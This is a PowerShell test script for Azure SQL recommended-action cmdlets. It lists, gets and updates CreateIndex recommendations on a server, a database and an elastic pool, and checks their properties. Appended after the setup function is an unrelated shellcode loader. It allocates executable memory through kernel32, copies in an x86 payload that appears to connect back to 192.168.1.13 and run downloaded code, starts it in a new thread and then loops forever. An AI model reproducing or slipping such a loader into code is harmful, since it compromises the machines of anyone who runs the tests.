





























function GetResourceNames()
{
	return @{ `
		"Location"          = "Australia East"
		"ResourceGroupName" = "WIRunnersProd"; `
		"ServerName"        = "wi-runner-australia-east"; `
		"DatabaseName"      = "WIRunner"; `
		"ElasticPoolName"   = "WIRunnerPool"; `
	}
}


function Test-ListServerRecommendedActions
{
	$names = GetResourceNames
	$response = Get-AzSqlServerRecommendedAction `
		-ResourceGroupName $names["ResourceGroupName"] `
		-ServerName $names["ServerName"] `
		-AdvisorName CreateIndex
	Assert-NotNull $response
	Assert-AreEqual $response.Count 2
}


function Test-GetServerRecommendedAction
{
	$names = GetResourceNames
	$response = Get-AzSqlServerRecommendedAction `
		-ResourceGroupName $names["ResourceGroupName"] `
		-ServerName $names["ServerName"] `
		-AdvisorName CreateIndex `
		-RecommendedActionName IR_[test_schema]_[test_table_0.0361551]_6C7AE8CC9C87E7FD5893
	Assert-NotNull $response
	ValidateServer $response
	ValidateRecommendedActionProperties $response
}


function Test-UpdateServerRecommendedAction
{
	$names = GetResourceNames
	$response = Set-AzSqlServerRecommendedActionState `
		-ResourceGroupName $names["ResourceGroupName"] `
		-ServerName $names["ServerName"] `
		-AdvisorName CreateIndex `
		-RecommendedActionName IR_[test_schema]_[test_table_0.0361551]_6C7AE8CC9C87E7FD5893 `
		-State Pending
	Assert-NotNull $response
	ValidateServer $response
	ValidateRecommendedActionProperties $response 'Pending'
}


function Test-ListDatabaseRecommendedActions
{
	$names = GetResourceNames
	$response = Get-AzSqlDatabaseRecommendedAction `
		-ResourceGroupName $names["ResourceGroupName"] `
		-ServerName $names["ServerName"] `
		-DatabaseName $names["DatabaseName"] `
		-AdvisorName CreateIndex
	Assert-NotNull $response
	Assert-AreEqual $response.Count 2
}


function Test-GetDatabaseRecommendedAction
{
	$names = GetResourceNames
	$response = Get-AzSqlDatabaseRecommendedAction `
		-ResourceGroupName $names["ResourceGroupName"] `
		-ServerName $names["ServerName"] `
		-DatabaseName $names["DatabaseName"] `
		-AdvisorName CreateIndex `
		-RecommendedActionName IR_[test_schema]_[test_table_0.0361551]_6C7AE8CC9C87E7FD5893
	Assert-NotNull $response
	ValidateDatabase $response
	ValidateRecommendedActionProperties $response
}


function Test-UpdateDatabaseRecommendedAction
{
	$names = GetResourceNames
	$response = Set-AzSqlDatabaseRecommendedActionState `
		-ResourceGroupName $names["ResourceGroupName"] `
		-ServerName $names["ServerName"] `
		-DatabaseName $names["DatabaseName"] `
		-AdvisorName CreateIndex `
		-RecommendedActionName IR_[test_schema]_[test_table_0.0361551]_6C7AE8CC9C87E7FD5893 `
		-State Pending
	Assert-NotNull $response
	ValidateDatabase $response
	ValidateRecommendedActionProperties $response 'Pending'
}

function Test-ListElasticPoolRecommendedActions
{
	$names = GetResourceNames
	$response = Get-AzSqlElasticPoolRecommendedAction `
		-ResourceGroupName $names["ResourceGroupName"] `
		-ServerName $names["ServerName"] `
		-ElasticPoolName $names["ElasticPoolName"] `
		-AdvisorName CreateIndex
	Assert-NotNull $response
	Assert-AreEqual $response.Count 2
}


function Test-GetElasticPoolRecommendedAction
{
	$names = GetResourceNames
	$response = Get-AzSqlElasticPoolRecommendedAction `
		-ResourceGroupName $names["ResourceGroupName"] `
		-ServerName $names["ServerName"] `
		-ElasticPoolName $names["ElasticPoolName"] `
		-AdvisorName CreateIndex `
		-RecommendedActionName IR_[test_schema]_[test_table_0.0361551]_6C7AE8CC9C87E7FD5893
	Assert-NotNull $response
	ValidateElasticPool $response
	ValidateRecommendedActionProperties $response
}


function Test-UpdateElasticPoolRecommendedAction
{
	$names = GetResourceNames
	$response = Set-AzSqlElasticPoolRecommendedActionState `
		-ResourceGroupName $names["ResourceGroupName"] `
		-ServerName wi-runner-australia-east `
		-ElasticPoolName $names["ElasticPoolName"] `
		-AdvisorName CreateIndex `
		-RecommendedActionName IR_[test_schema]_[test_table_0.0361551]_6C7AE8CC9C87E7FD5893 `
		-State Pending
	Assert-NotNull $response
	ValidateElasticPool $response
	ValidateRecommendedActionProperties $response 'Pending'
}


function ValidateServer($recommendedAction)
{
	Assert-AreEqual $recommendedAction.ResourceGroupName $names["ResourceGroupName"]
	Assert-AreEqual $recommendedAction.ServerName $names["ServerName"]
	Assert-AreEqual $recommendedAction.AdvisorName "CreateIndex"
}


function ValidateDatabase($recommendedAction)
{
	ValidateServer $recommendedAction
	Assert-AreEqual $recommendedAction.DatabaseName $names["DatabaseName"]
}


function ValidateElasticPool($recommendedAction)
{
	ValidateServer $recommendedAction
	Assert-AreEqual $recommendedAction.ElasticPoolName $names["ElasticPoolName"]
}


function ValidateRecommendedActionProperties($recommendedAction, $expectedState = "Success")
{
	Assert-AreEqual $recommendedAction.RecommendedActionName "IR_[test_schema]_[test_table_0.0361551]_6C7AE8CC9C87E7FD5893"
	Assert-AreEqual $recommendedAction.ExecuteActionDuration "PT1M"
	Assert-AreEqual $recommendedAction.ExecuteActionInitiatedBy "User"
	Assert-AreEqual $recommendedAction.ExecuteActionInitiatedTime "4/21/2016 3:24:47 PM"
	Assert-AreEqual $recommendedAction.ExecuteActionStartTime "4/21/2016 3:24:47 PM"
	Assert-AreEqual $recommendedAction.IsArchivedAction $false
	Assert-AreEqual $recommendedAction.IsExecutableAction $true
	Assert-AreEqual $recommendedAction.IsRevertableAction $true
	Assert-AreEqual $recommendedAction.LastRefresh "4/21/2016 3:24:47 PM"
	Assert-AreEqual $recommendedAction.RecommendationReason ""
	Assert-Null $recommendedAction.RevertActionDuration
	Assert-Null $recommendedAction.RevertActionInitiatedBy
	Assert-Null $recommendedAction.RevertActionInitiatedTime
	Assert-Null $recommendedAction.RevertActionStartTime
	Assert-AreEqual $recommendedAction.Score 2
	Assert-AreEqual $recommendedAction.ValidSince "4/21/2016 3:24:47 PM"
	
	ValidateRecommendedActionState $recommendedAction.State $expectedState
	ValidateRecommendedActionImplInfo $recommendedAction.ImplementationDetails
	Assert-Null $recommendedAction.ErrorDetails.ErrorCode
	Assert-AreEqual $recommendedAction.EstimatedImpact.Count 2
	Assert-AreEqual $recommendedAction.ObservedImpact.Count 1
	Assert-AreEqual $recommendedAction.TimeSeries.Count 0
	Assert-AreEqual $recommendedAction.LinkedObjects.Count 0
	ValidateRecommendedActionDetails $recommendedAction.Details
}


function ValidateRecommendedActionState($state, $expectedState)
{
	Assert-AreEqual $state.ActionInitiatedBy "User"
	Assert-AreEqual $state.CurrentValue $expectedState
	Assert-AreEqual $state.LastModified "4/21/2016 3:24:47 PM"
}


function ValidateRecommendedActionImplInfo($implInfo)
{
	Assert-AreEqual $implInfo.Method "TSql"
	Assert-AreEqual $implInfo.Script "CREATE NONCLUSTERED INDEX [nci_wi_test_table_0.0361551_6C7AE8CC9C87E7FD5893] ON [test_schema].[test_table_0.0361551] ([index_1],[index_2],[index_3]) INCLUDE ([included_1]) WITH (ONLINE = ON)"
}


function ValidateRecommendedActionDetails($details)
{
	Assert-AreEqual $details.Item("indexName") "nci_wi_test_table_0.0361551_6C7AE8CC9C87E7FD5893"
	Assert-AreEqual $details.Item("indexType") "NONCLUSTERED"
	Assert-AreEqual $details.Item("schema") "[test_schema]"
	Assert-AreEqual $details.Item("table") "[test_table_0.0361551]"
	Assert-AreEqual $details.Item("indexColumns") "[index_1],[index_2],[index_3]"
	Assert-AreEqual $details.Item("benefit") "2"
	Assert-AreEqual $details.Item("includedColumns") "[included_1]"
	Assert-AreEqual $details.Item("indexActionStartTime") "04/21/2016 15:24:47"
	Assert-AreEqual $details.Item("indexActionDuration") "00:01:00"
}


function SetupResources()
{
	$names = GetResourceNames

	
	New-AzResourceGroup -Name $names["ResourceGroupName"] -Location $names["Location"]
	
	
	$serverLogin = "testusername"
	$serverPassword = "t357ingP@s5w0rd!"
	$credentials = new-object System.Management.Automation.PSCredential($serverLogin `
		, ($serverPassword | ConvertTo-SecureString -asPlainText -Force)) 
	
	New-AzSqlServer -ResourceGroupName  $names["ResourceGroupName"] `
		-ServerName $names["ServerName"] `
		-Location $names["Location"] `
		-ServerVersion "12.0" `
		-SqlAdministratorCredentials $credentials

	
	New-AzSqlDatabase `
		-ResourceGroupName $names["ResourceGroupName"] `
		-ServerName $names["ServerName"] `
		-DatabaseName $names["DatabaseName"] `
		-Edition Basic

	
	New-AzSqlElasticPool `
		-ResourceGroupName $names["ResourceGroupName"] `
		-ServerName $names["ServerName"] `
		-ElasticPoolName $names["ElasticPoolName"] `
		-Edition Basic
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0d,0x68,0x02,0x00,0x0d,0x3d,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

